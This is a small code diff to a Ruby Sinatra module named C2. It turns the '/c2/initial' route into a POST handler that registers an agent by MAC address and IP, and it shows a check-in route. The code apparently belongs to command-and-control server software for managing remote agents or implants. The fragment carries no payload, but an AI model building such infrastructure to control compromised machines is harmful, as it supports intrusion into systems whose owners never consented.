@@ -4,8 +4,11 @@ module Sinatra
 			module C2
 				def self.registered(app) 
 
-					app.get '/c2/initial' do
-						
+					app.post '/c2/initial' do
+						if not @agent = Agent.first(mac: params[:mac])
+							@agent = Agent.create(mac: params[:mac], last_ip: params[:ip])
+						end
+						jbuilder :initial_json
 					end
 
 					app.get '/c2/checkin/:id' do
